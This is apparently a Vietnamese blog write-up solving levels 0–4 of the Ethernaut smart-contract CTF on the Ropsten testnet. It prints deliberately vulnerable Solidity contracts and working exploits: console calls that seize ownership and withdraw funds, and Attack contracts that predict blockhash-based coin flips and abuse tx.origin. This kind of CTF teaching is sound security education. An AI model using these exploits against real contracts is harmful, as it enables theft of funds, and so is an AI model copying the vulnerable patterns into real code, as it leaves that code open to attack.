Những năm gần đây, **Blockchain** và các ứng dụng của nó nổi lên như một xu thế công nghệ của tương lai. Áp dụng **Blockchain**, ta có thể giải quyết được rất nhiều vấn đề mà các công nghệ hiện tại không làm được, mà trong đó nổi bật nhất là không còn trung gian giao dịch, không cần tin tưởng vào một bên thứ 3 nào nữa. Điều này khiến cho mọi thứ trở nên đơn giản hơn, tiện lợi hơn, minh bạch hơn, sự tin tưởng cao hơn.

Tuy vậy **Blockchain** không phải chỉ có toàn ưu điểm, nó vẫn còn là một công nghệ còn rất "mới" và sẽ cần nhiều thời gian nữa để hoàn thiện. Một số nhược điểm cơ bản có thể kể đến như tốc độ confirm giao dịch vẫn còn chậm, chi phí còn cao đối với các giao dịch nhỏ. Một điều nữa là *user experience* - người dùng phổ thông vẫn chưa sẵn sàng với khái niệm **Blockchain**, sự tin tưởng vào công nghệ này vẫn còn cần rất nhiều sự minh chứng nữa.

Và một điều được coi như "sống còn" của sự hoàn thiện: đó chính là tính **bảo mật**. Đối với bất kỳ sản phẩm nào, dù lớn hay nhỏ, chỉ cần một lần xảy ra sự cố bảo mật thôi, cũng có thể dẫn đến sự sụp đổ của cả một hệ thống. **Blockchain** cũng vậy, nó chưa hoàn hảo, và vẫn còn những lỗi bảo mật tiềm ẩn, cả trong kiến trúc **Blockchain** lẫn trong những đoạn code của các ứng dụng trên nền tảng này.

Trong bài này, chúng ta sẽ đi qua một số lỗi bảo mật của các smart contract trên nền tảng Ethereum thông qua một CTF games của Zeppelin - một hãng rất nổi tiếng hiện nay trong xây dựng các solutions cho smart contract. CTF này có tên là **The Ethernaut** - nội dung chủ đạo là *hacking smart contract*.

Các bạn có thể tham gia chơi tại đây: [https://ethernaut.zeppelin.solutions](https://ethernaut.zeppelin.solutions)

Một vài recommend:

- Sẽ tốt hơn nếu bạn có kiến thức về **Blockchain** và **Smart Contract**
- Sẽ tốt hơn nếu bạn có kiến thức về **Solidity** và **Web3js**
- Sẽ là tốt hơn nếu bạn biết cách sử dụng **Remix IDE** hoặc **Truffle**

# Zeppelin Ethernaut

CTF sẽ bao gồm tất cả 12 bài, chạy trên Ropsten networks. Bạn sẽ cần chuẩn bị một vài thứ sau (những cài đặt này đều đơn giản nên các bạn có thể tự search & cài):

- Cài đặt Metamask
- Tạo một account trên Ropsten Testnet, sau đó vào [https://faucet.metamask.io/](https://faucet.metamask.io/) để lấy vài ether.
- Bật Chrome Console
- Bật Remix IDE [https://remix.ethereum.org](https://remix.ethereum.org)

Tại mỗi bài, chúng ta sẽ được cấp một instance, địa chỉ instance được trả về trên console khi start. Chúng ta sẽ tương tác với contract instance thông qua console (bài dễ) hoặc Remix IDE (bài khó hơn chút & cần phải code)

## 0. Hello Ethernaut

Đây là bài hướng dẫn khởi động, rất là đơn giản thôi, chủ yếu để chúng ta test các hàm họ dựng sẵn rồi. OK lets go!

### Solution

- Ta chưa biết mình phải làm gì ngoài một gợi ý tại bước hướng dẫn số 9. Ta sẽ bắt đầu bằng `contract.info()` trên Chrome Console

```js
await contract.info()
"You will find what you need in info1()."
```

- Một chỉ dẫn rất rõ ràng, chạy tiếp hàm `info1`

```js
await contract.info1()
"Try info2(), but with "hello" as a parameter."
```

- Tiếp tục `info2` với giá trị tham số "hello"

```js
await contract.info2("hello")
"The property infoNum holds the number of the next info method to call."
```

- Tiếp tục gọi `infoNum`

```js
await contract.infoNum()
t {s: 1, e: 1, c: Array(1)}
c: [42]
e: 1
s: 1
__proto__: Object
```

- đây là số ở dạng **Big Number**, chúng ta không cần biết nó để làm gì, nhưng ta biết hàm tiếp theo được gọi sẽ là `info42`

```js
await contract.info42()
"theMethodName is the name of the next method."
```

- chạy tiếp `theMethodName`

```js
await contract.theMethodName()
"The method name is method7123949."
```

- chạy tiếp `method7123949`

```js
await contract.method7123949()
"If you know the password, submit it to authenticate()."
```

- vậy là đã rõ, để hoàn thành bài này ta cần submit function `authenticate` với tham số là `password`. Gọi hàm `password` để lấy password.

```js
await contract.password()
"ethernaut0"
```

- authenticate

```js
contract.authenticate("ethernaut0")
```

- Submit & all done!

## 1. Fallback

**Mục tiêu**:

1. Chiếm quyền owner
2. Rút hết tiền khỏi contract

```js
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Fallback Solution

- Ở bài này ta sẽ học được về  `fallback function`. Đây là một hàm đặc biệt trong smart contract, nó không có tên hàm và được sử dụng khi: contract nhận ether, hoặc khi có ai đó gọi hàm không có trong contract hoặc tham số không đúng. 
- Ở đây có một sự đánh lừa nhẹ: hàm `Fallback` không phải là fallback function (dù tên hàm là *Fallback*), mà chính `function() payable public` mới là fallback function. Từ đó ta có cách khai thác như sau: đầu tiên gọi function `contribute()` với một giá trị nhỏ hơn 0.001 để  trở thành contributor

```js
await contract.contribute({value:toWei(0.0001)})
```

- Kiểm tra xem đã trở thành contributor chưa, nếu kết quả > 0 thì có nghĩa là ta đã trở thành contributor rồi

```js
await contract.getContribution().then(x => x.toNumber())
```

- Sau đó send ether tới contract để kích hoạt fallback, khi đó ta sẽ trở thành owner

```js
contract.send(1)
```

- Kiểm tra xem đã trở thành owner chưa

```js
await contract.owner()
```

- Rút toàn bộ tiền khỏi contract

```js
contract.withdraw()
```

- Submit & all done!

## 2. Fallout

**Mục tiêu**: Chiếm quyền owner

```js
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract Fallout is Ownable {

  mapping (address => uint) allocations;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  function allocate() public payable {
    allocations[msg.sender] += msg.value;
  }

  function sendAllocation(address allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(this.balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Fallout Solution

- Đơn giản chỉ cần chạy function **Fal1out** là được, lưu ý contract cố tình viết sai chữ *l* thành số *1* nên nó không phải là constructor mà chỉ là một function thông thường có nhiệm vụ là **trao quyền owner**

```js
contract.Fal1out()
```

- Kiểm tra xem đã trở thành owner chưa

```js
await contract.owner()
```

- Submit & all done!

## 3.Coin Flip

Đây là một bài tung đồng xu, nhiệm vụ của chúng ta là phải đoán trúng mặt sấp hoặc ngửa 10 lần liên tiếp.

```js
pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### Coin Flip Solution

- Đầu tiên, khẳng định một điều rằng: việc tự đoán 10 lần đúng liên tiếp bằng đỏ đen gần như là bất khả thi.
- Nhận thấy rằng trong function flip() có tính toán mặt sấp/ngửa sau đó submit kết quả luôn, nên ta không thể biết được kết quả tính toán là gì để can thiệp vào quá trình submit. Tuy nhiên nó gợi ý tưởng cho ta có thể viết một contract khác chia function đó ra làm đôi, một function có nhiệm vụ tính toán và một function có nhiệm vụ submit kết quả.
- Đã đến lúc phải code, ta sẽ sử dụng Remix IDE thay cho Chrome console. Ta sẽ viết một contract **Attack** khác như sau, nhớ hay thế biến target bằng địa chỉ instance của bạn:

```js
pragma solidity ^0.4.18;


contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract Attack {
  CoinFlip cf;
  // replace target by your instance address
  address target = 0x6638326b577520c1eb0856745f294582b64ce96d;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attack() {
    cf = CoinFlip(target);
  }

  function calc() public view returns (bool){
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    return coinFlip == 1 ? true : false;
  }

  function flip() public {
    bool guess = calc();
    cf.flip(guess);
  }
}
```

- Compile contract này và chạy function flip *bằng tay* 10 lần trên Remix, nhớ để Gas Limit  và Gas Price cao một chút để tránh bị *out of gas* và để transaction được confirm nhanh hơn.

- Trên chrome console, kiểm tra lại số lần liên tiếp đoán đúng, 10 lần là được

```js
await contract.consecutiveWins().then(x => x.toNumber())
```

- Submit & all done!

## 4. Telephone

**Nhiệm vụ**: chiếm quyền owner

```js
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Telephone Solution

- Bạn cần hiểu rõ một điều `tx.origin` khác với `msg.sender`.
- Nếu bạn gọi function từ một contract A, trong function có có gọi function của contract B, thì `tx.origin` là địa chỉ của bạn còn `msg.sender` là contract A address.
- Kẻ xấu có thể lợi dụng điều này để tấn công một contract bằng cách sử dụng một contract khác để tấn công.
- Trong bài này, ta sẽ viết thêm một contract **Attack** như sau:

```js
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
  Telephone phone;
  // replace target by your instance address
  address target = 0x7828d70649688ad7fb4fa2b34430e92096b6fb47;

  function Attack() {
      phone = Telephone(target);
  }

  function claimOwnership() public {
      phone.changeOwner(msg.sender);
  }
}
```

- Compile contract này và chạy hàm `claimOwnership` trên Remix, quyền owner sẽ thuộc về bạn.
- Trên chrome console, kiểm tra lại contract owner

```js
await contract.owner()
```

- Submit & all done!

## Conclusion

Trên đây là solution 5 bài đầu tiên trong tổng số tất cả 12 bài trong **The Ethernaut** CTF game. Nội dung không quá phức tạp, song trên thực tế, đó lại chính là những lỗi security lớn nhất của các smart contract trên **Blockchain** hiện nay.

Liên quan trực tiếp đến túi tiền của chúng ta, nên mọi thứ đều cần phải thực sự cẩn thận & không một lỗi lầm.

Hẹn gặp lại các bạn trong phần tới. Coming soon!

## References
- [The Ethernaut](https://ethernaut.zeppelin.solutions/)
- [Remix](https://remix.ethereum.org/)
- [Solidity Docs](http://solidity.readthedocs.io/en/develop/types.html#members-of-addresses
)